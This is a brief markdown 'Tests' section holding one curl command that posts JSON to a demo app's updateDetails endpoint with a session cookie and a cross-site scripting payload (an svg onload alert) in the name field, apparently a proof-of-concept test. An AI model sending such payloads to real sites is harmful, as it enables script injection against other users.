## Tests
```
curl -X POST -H "Content-Type: application/json" --cookie "PHPSESSID=hibcw4d4u4r8q447rz8221n" \
-d '{"id":7357, "name":"Bob<svg/onload=alert(\"Woop!\") display=none>", "age":25}' \
http://demoapp.com/updateDetails
```
